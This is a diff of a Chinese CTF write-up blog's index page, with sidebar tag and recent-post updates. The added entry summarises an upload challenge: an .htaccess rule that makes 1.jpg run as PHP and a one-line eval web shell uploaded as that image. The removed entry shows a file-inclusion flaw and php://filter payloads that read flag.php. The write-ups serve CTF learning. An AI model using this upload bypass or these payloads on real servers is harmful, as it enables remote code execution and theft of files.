@@ -131,6 +131,51 @@
 						<div class="row">
 							<div class="col-md-8">
 								<h3 class="title">
+									<a href="/2023/07/17/SWPUCTF2022-easyupload3-wp/" >SWPUCTF2022-easyupload3-wp</a>
+								</h3>
+							</div>
+							<div class="col-md-4">
+								<div class="date">post @ 2023-07-17
+								</div>
+							</div>
+						</div>
+						
+								
+			<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2025">题目链接</a></p>
+<ul>
+<li>apache服务器，标题提示“试试和某些文件配合呢”，尝试上传<code>.htacess</code> 文件，内容：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt; </span><br><span class="line">       SetHandler  application/x-httpd-php  </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传成功</p>
+<blockquote>
+<p>笼统地说，.htaccess可以帮我们实现包括：文件夹密码保护、用户自动重定向、自定义错误页面、改变你的文件扩展名、封禁特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表，以及使用其他文件作为index文件等一些功能。</p>
+</blockquote>
+<p>相当于设定规则，把1.jpg当作php代码解析</p>
+<ul>
+<li><p>上传1.jpg</p>
+<p>内容为一句话木马：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
+</li>
+<li><p>访问 <code>/upload/1.jpg</code>   POST cmd&#x3D;phpinfo();  搜索flag即可看到</p>
+</li>
+</ul>
+
+	
+	</div>
+  <a type="button" href="/2023/07/17/SWPUCTF2022-easyupload3-wp/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+					
+						<!-- display as entry -->
+						<div class="row">
+							<div class="col-md-8">
+								<h3 class="title">
 									<a href="/2023/07/17/NISACTF2022-babyupload-wp/" >NISACTF2022-babyupload-wp</a>
 								</h3>
 							</div>
@@ -676,44 +721,6 @@
 </div>
 
 		
-			
-					
-						<!-- display as entry -->
-						<div class="row">
-							<div class="col-md-8">
-								<h3 class="title">
-									<a href="/2023/07/11/SWPUCTF2022-ezezphp-wp/" >SWPUCTF2022-ez_ez_php-wp</a>
-								</h3>
-							</div>
-							<div class="col-md-4">
-								<div class="date">post @ 2023-07-11
-								</div>
-							</div>
-						</div>
-						
-								
-			<div class="entry">
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/2640">题目链接</a>  </p>
-<h2 id="页面源码"><a href="#页面源码" class="headerlink" title="页面源码"></a>页面源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">substr</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>], <span class="number">0</span>, <span class="number">3</span>) === <span class="string">&quot;php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Nice!!!&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>]);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag.php</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
-<li>提示flag.php</li>
-<li>过滤要求输入为php开头  明显使用伪协议</li>
-</ol>
-<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）file:<span class="comment">// 访问本地文件系统</span></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）http:<span class="comment">// 访问HTTP(S)网址</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）ftp:<span class="comment">// 访问FTP(S)URL</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>)php:<span class="comment">// 访问各个输出输入流 			php://filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>)zlib:<span class="comment">// 处理压缩流</span></span><br><span class="line"></span><br><span class="line"><span class="number">6</span>)data:<span class="comment">// 读取数据</span></span><br><span class="line"></span><br><span class="line"><span class="number">7</span>)glob:<span class="comment">// 查找匹配的文件路径模式</span></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>)phar:<span class="comment">// PHP归档</span></span><br><span class="line"></span><br><span class="line"><span class="number">9</span>)rar:<span class="comment">// RAR数据压缩</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br><span class="line"><span class="comment">// 获得base64  解码后提示flag在flag文件中</span></span><br><span class="line">?file=php:<span class="comment">//filter/convert.base64-encode/resource=flag</span></span><br><span class="line"><span class="comment">// 获得flag</span></span><br></pre></td></tr></table></figure>
-
-
-	
-	</div>
-  <a type="button" href="/2023/07/11/SWPUCTF2022-ezezphp-wp/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -765,7 +772,7 @@
 		
 			<li><a href="/categories/pwn-learning/">pwn-learning<span>5</span></a></li>
 		
-			<li><a href="/categories/pwn-wp/">pwn-wp<span>8</span></a></li>
+			<li><a href="/categories/pwn-wp/">pwn-wp<span>9</span></a></li>
 		
 			<li><a href="/categories/reverse-learning/">reverse-learning<span>1</span></a></li>
 		
@@ -784,48 +791,48 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/HCTF2016/">HCTF2016<span>1</span></a></li>
-		
-			<li><a href="/tags/BJDCTF2020/">BJDCTF2020<span>1</span></a></li>
-		
-			<li><a href="/tags/bypass/">bypass<span>1</span></a></li>
-		
-			<li><a href="/tags/SWPUCTF2021/">SWPUCTF2021<span>11</span></a></li>
-		
-			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
-		
-			<li><a href="/tags/stack/">stack<span>4</span></a></li>
-		
-			<li><a href="/tags/dcquals2016/">dcquals2016<span>1</span></a></li>
-		
-			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
-		
-			<li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
-		
-			<li><a href="/tags/sql/">sql<span>7</span></a></li>
-		
-			<li><a href="/tags/nssctf/">nssctf<span>33</span></a></li>
-		
-			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+			<li><a href="/tags/csawquals2017/">csawquals2017<span>1</span></a></li>
 		
 			<li><a href="/tags/file-include/">file_include<span>2</span></a></li>
 		
-			<li><a href="/tags/GXYCTF2019/">GXYCTF2019<span>1</span></a></li>
+			<li><a href="/tags/reverse/">reverse<span>8</span></a></li>
 		
-			<li><a href="/tags/web/">web<span>27</span></a></li>
+			<li><a href="/tags/BKP2016/">BKP2016<span>1</span></a></li>
 		
-			<li><a href="/tags/nightmare/">nightmare<span>2</span></a></li>
+			<li><a href="/tags/HUBUCTF2022/">HUBUCTF2022<span>1</span></a></li>
 		
 			<li><a href="/tags/ret2syscall/">ret2syscall<span>2</span></a></li>
 		
-			<li><a href="/tags/pwn/">pwn<span>13</span></a></li>
+			<li><a href="/tags/upload/">upload<span>5</span></a></li>
 		
-			<li><a href="/tags/GDOUCTF2023/">GDOUCTF2023<span>2</span></a></li>
+			<li><a href="/tags/CVE/">CVE<span>4</span></a></li>
 		
-			<li><a href="/tags/php伪协议/">php伪协议<span>1</span></a></li>
+			<li><a href="/tags/stack/">stack<span>5</span></a></li>
+		
+			<li><a href="/tags/str-format/">str_format<span>1</span></a></li>
+		
+			<li><a href="/tags/fuzz/">fuzz<span>4</span></a></li>
+		
+			<li><a href="/tags/include/">include<span>1</span></a></li>
+		
+			<li><a href="/tags/鹏城杯2022/">鹏城杯2022<span>1</span></a></li>
+		
+			<li><a href="/tags/zer0pts2020/">zer0pts2020<span>1</span></a></li>
+		
+			<li><a href="/tags/heap/">heap<span>2</span></a></li>
+		
+			<li><a href="/tags/unserialise/">unserialise<span>2</span></a></li>
+		
+			<li><a href="/tags/nightmare/">nightmare<span>3</span></a></li>
+		
+			<li><a href="/tags/UUCTF2022/">UUCTF2022<span>2</span></a></li>
+		
+			<li><a href="/tags/pesudoProtocol/">pesudoProtocol<span>1</span></a></li>
+		
+			<li><a href="/tags/pwn/">pwn<span>14</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>45</span></a></li>
+		   <li><a href="/tags">...<span>47</span></a></li>
 		 
 		</ul>
 	</div>
@@ -836,6 +843,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2023/08/16/csawquals2017-svc-wp/" ><i class="fa fa-file-o"></i>Csaw 2017 Quasl SVC-wp</a>
+      </li>
     
       <li>
         <a href="/2023/08/16/HCTF2016-兵者多诡-wp/" ><i class="fa fa-file-o"></i>HCTF2016-兵者多诡-wp</a>
@@ -851,10 +862,6 @@
     
       <li>
         <a href="/2023/08/12/symbol-restore/" ><i class="fa fa-file-o"></i>符号表恢复</a>
-      </li>
-    
-      <li>
-        <a href="/2023/08/10/D3CTF2019-ezupload/" ><i class="fa fa-file-o"></i>D3CTF2019-ezupload</a>
       </li>
     
   </ul>
